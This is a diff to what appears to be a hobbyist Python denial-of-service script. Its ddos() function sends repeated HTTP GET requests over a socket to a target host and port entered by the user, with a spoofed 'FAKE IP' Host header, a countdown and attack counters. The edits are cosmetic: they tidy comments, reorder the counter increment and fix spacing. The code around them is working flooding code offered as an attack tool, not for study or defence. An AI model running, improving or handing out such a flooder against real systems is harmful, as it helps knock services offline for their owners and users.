@@ -30,8 +30,7 @@ def ddos():
             break;
     print(f"performing Ddos on {trget} on PORT {port} using FAKE IP {fake} ")
     print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect,you can restart the script and again enter the details correctly!!")
-   # print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " Press CTRL + C and press Enter to Exit!")
-    #print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.WHITE + "Press CTRL + C and press enter to exit!!")
+    #print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " Press CTRL + C and press Enter to Exit!")
     time.sleep(4)
     print(Fore.YELLOW + Style.BRIGHT + "DDos starting in ~")
     print("seconds : 3")
@@ -50,10 +49,10 @@ def ddos():
                 s.sendto(("GET /" + trget + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
-                attack_num += 1
                 time.sleep(1)
+                attack_num += 1
                 print(f"\n[💥]\033[38;5;39m Get > \033[37m| \033[38;5;220m{trget} \033[37m|\033[38;5;37m Port \033[91m{port}") 
-                print(f"\n[☠️]\033[37m H0st > | \033[33m{fake}  \033[37m | running \033[32m{attack_num}")
+                print(f"\n[☠️]\033[37m H0st > | \033[33m{fake} \033[37m | running \033[32m{attack_num}")
             except socket.error:
                 print('\033[32mConnection failid \033[31mHost may be down \033[94mPlease check host\033[0m')
                 break
